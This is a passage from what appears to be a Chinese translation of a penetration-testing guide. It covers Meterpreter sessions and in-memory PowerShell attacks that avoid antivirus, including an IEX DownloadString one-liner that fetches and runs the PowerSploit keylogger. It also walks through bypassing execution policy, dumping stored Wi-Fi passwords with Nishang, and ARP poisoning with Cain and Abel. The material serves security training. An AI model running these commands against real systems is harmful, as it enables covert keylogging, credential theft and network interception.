

# PowerShell 后渗透与 ARP 投毒

## Meterpreter 会话建立

脚本在受害者主机上下载并执行后，我们应返回运行监听器的系统（即我们在 Kali Linux 主机上执行 `StartListner.py` 的地方）。现在我们应该能看到受害者主机连回我们的服务器，且 Meterpreter 会话已建立。

![](images/00128.jpeg)

**图 78 - 反向 HTTPS 会话**

在运行 Meterpreter 处理器的攻击者主机上，我们会获得 stager 并打开会话。随后 `AutoRunScripts` 会迁移进程，以防止我们的会话被终止，现在我们在受害者主机上拥有了一个完整的 Meterpreter shell。^([17](#part0018.html#id_499)[18](#part0018.html#id_501))

如果你在受害者主机上观察整个过程，会注意到初始命令是通过 `powershell.exe` 执行的。主机随后将脚本下载到内存并从内存中执行 shell。这意味着没有文件被释放到受害者主机上，杀毒软件极不可能触发任何特征码匹配。更妙的是，如果主机系统提供任何类型的白名单保护，它们极有可能已批准 `powershell.exe`，因为它是默认的 Windows 功能。

## 加载 PowerSploit 模块

一旦进入主机，你可以轻松加载其他 PowerShell 脚本。请查看 [https://github.com/mattifestation/PowerSploit/tree/master](https://github.com/mattifestation/PowerSploit/tree/master) 以了解所有可用的其他模块。这些模块涵盖持久化工具、AV 绕过、数据窃取、侦察等。让我们再看一个来自 mattifestation GitHub 的示例。PowerSploit 自带一个键盘记录器，位于此处：[https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)。我们将在有权限访问的系统上加载并启用它。请记住，键盘记录器将完全在内存中运行，但会将输出写入受害者主机上的文件。

首先进入 PowerShell 并执行以下命令：

*   `powershell.exe`
*   `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')`

这将把脚本下载并执行到内存中。然后要开启键盘记录功能，可以使用以下命令：

*   `Get-Keystrokes -LogPath C:\\key.log -CollectionInterval 1`

输出将位于 `C:\\key.log`。你也可以通过使用与 PowerShell Meterpreter 脚本相同的命令和步骤远程执行这些命令。

### 其他有用的 PowerSploit 脚本

*   `Exfiltration/Out-Minidump.ps1` (转储进程内存)
*   `Exfiltration/Get-TimedScreenshot.ps1` (截取受害者计算机屏幕截图)

我非常欣赏这些人为让 PowerShell 对渗透测试人员更强大所做的努力。截至目前，我在使用 PowerShell 部署横向攻击时，未见任何杀毒软件或特征码触发报警。

![](images/00129.jpeg)

## Nishang 框架

([https://code.google.com/p/nishang/](https://code.google.com/p/nishang/)) (Windows)

PowerShell 社区的另一位活跃成员是 Nikhil Mittal。你可以在 [https://code.google.com/p/nishang/](https://code.google.com/p/nishang/) 找到他的作品，撰写本文时当前版本为 3.0。

他的大多数 PowerShell 脚本专注于后渗透和信息收集。让我们看看他开发了哪些脚本。最容易上手的 PowerShell 脚本名为 `Get-Information.ps1`。让我们尝试使用以下命令原生运行该 PowerShell 脚本：

*   `PowerShell -file Get-Information.ps1`

![](images/00130.jpeg)

**图 79 - Get-Information.ps1**

在上图中，我们看到执行因禁止运行不受信任脚本的策略而失败。我们之前讨论过，如果禁用了 PowerShell 执行，可以使用以下开关绕过策略：

*   `PowerShell -ExecutionPolicy bypass -file Get-Information.ps1`

这几乎能使针对 PowerShell 的任何保护失效。PowerShell 不仅默认存在于所有 Windows 7 及更高版本系统中，而且这些脚本极难被阻止。查看 `Get-Information` 脚本的细节，我们可以看到它将呈现什么输出。请看以下代码：

![](images/00131.jpeg)

**图 80 - 收集信息列表**

该脚本将从 PowerShell 环境、Putty 信息、最近使用的命令、共享、环境变量、SNMP 信息、已安装应用程序、域信息、用户信息、系统信息和无线信息中提取数据。以下是成功执行 PowerShell 脚本的示例输出：

![](images/00132.jpeg)

**图 81 - 系统信息**

后渗透阶段你会用到的大量信息都在此引用。除了这个综合脚本，另一个有用的示例是 `Get-WLAN-Keys.ps1`。运行 `.\\Get-WLAN-Keys.ps1`，我们最终会提取所有用户的 Wi-Fi 信息和存储的设置，其中包括 SSID 和密码。

![](images/00133.jpeg)

**图 82 - 无线密钥**

从上面的示例中，我们可以看到 SSID 名称和存储在 `Key_Content` 中的密码。^([19](#part0018.html#id_29)) 如果他们使用静态密钥认证过程（非 WPA-Enterprise），我们现在可以连接到他们的无线网络，而无需破解任何哈希值。

如果你想了解 Nishang 工具的更多功能，请访问他的网站 [http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html](http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html)。正如我们所见，PowerShell 极其强大，随着更多研究人员投入 PowerShell 领域，我们将看到越来越多面向渗透测试人员的功能。

![](images/00134.jpeg)

## ARP 投毒攻击

我遇到的需要 ARP 投毒的测试不多了，但有时仍会将投毒作为最后的手段。既然 ARP 投毒不是新攻击，我不会深入探讨 ARP 投毒为何有效或如何防范。我只会快速演示如何设置 ARP 类攻击，以及我如何在实战中最好地利用它们。

![](images/00135.jpeg)

当谈到执行 ARP 欺骗/投毒攻击时，我通常依赖两个工具。我发现非常有用的两个工具是 `Cain and Abel` 和 `Ettercap`。

### Cain and Abel (Windows)

**下载：** [http://www.oxid.it/cain.html](http://www.oxid.it/cain.html)

**操作系统：** Windows

如果你想了解 ARP 欺骗为何有效，可以在 [http://www.irongeek.com/i.php?page=security/arpspoof](http://www.irongeek.com/i.php?page=security/arpspoof) 阅读更多内容。让我们看看如何使用 `Cain and Abel` 对受害者进行 ARP 欺骗。要在 `Cain` 中成功进行 ARP 欺骗，点击左上角的嗅探器按钮，点击嗅探器选项卡，然后选择 `扫描 MAC 地址` 按钮。

![](images/00136.jpeg)

**图 83 - Cain and Abel 扫描 MAC 地址**

接下来，在 `Cain` 底部切换到 APR 选项卡，在左侧列选择 APR，点击顶部工具栏的“加号”按钮（注意：+ 按钮可能不可见。尝试点击中间窗格以启用该按钮）。

![](images/00137.jpeg)

**图 84 - APR 列表**

这应该会显示之前扫描的 IP，你需要选择要进行 ARP 欺骗的主机 IP 和网关 IP。

![](images/00138.jpeg)

**图 85 - APR 投毒路由**

最后，你需要点击顶部菜单栏的 `APR 投毒` 开始/停止按钮，大功告成。

![](images/00139.jpeg)

**图 86 - 成功投毒**

